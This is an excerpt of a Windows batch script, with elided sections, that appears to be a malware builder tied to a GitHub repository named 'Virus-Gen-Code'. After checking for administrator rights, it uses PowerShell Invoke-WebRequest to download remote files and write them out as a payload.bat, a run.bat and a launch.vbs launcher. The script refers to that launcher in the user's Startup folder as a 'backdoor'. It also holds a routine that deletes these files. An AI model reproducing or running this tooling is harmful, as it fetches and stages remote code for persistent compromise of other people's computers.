...
:start
@echo off
set update_number=V3.25.20
set dev=0
set temp=0 & set payload_is_exist=0 & set cmd_is_exist=0
color 0F
...
goto CP
:adminyes
if exist C:\ProgramData\UPnum.sav (goto UPcheck) else (goto UPcreate)
:UPnxt
git version >git.sav
...
:emailnext
if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs" goto backdoor_remove
:no_remove_backdoor
...
if %errorlevel% equ 1 (set target_admin_rights=true) else (set target_admin_rights=false)
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder").Content >%opt1%.bat
...
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL").Content >%opt2%\payload\launch.vbs
...
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC").Content >%opt2%\payload\payload.bat
...
if %target_admin_rights% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_yes_admin").Content >%opt2%\run.bat
if %target_admin_rights% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_no_admin").Content >%opt2%\run.bat
...
echo [31mextra information: if you have git portable a system to allow that will be implemented soon[0m
echo.
...
if %UPnum% equ %update_number% goto UPnxt
:UPlogs
echo %update_number% >C:\ProgramData\UPnum.sav
...
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs"
if not exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs" (echo [92mlaunch.vbs removed[0m)
if %payload_is_exist% equ 1 del "C:\users\%username%\AppData\payload.bat"
if %payload_is_exist% equ 1 (echo [92mpayload.bat removed[0m)
if %cmd_is_exist% equ 1 (del "C:\users\%username%\AppData\cmd.bat")
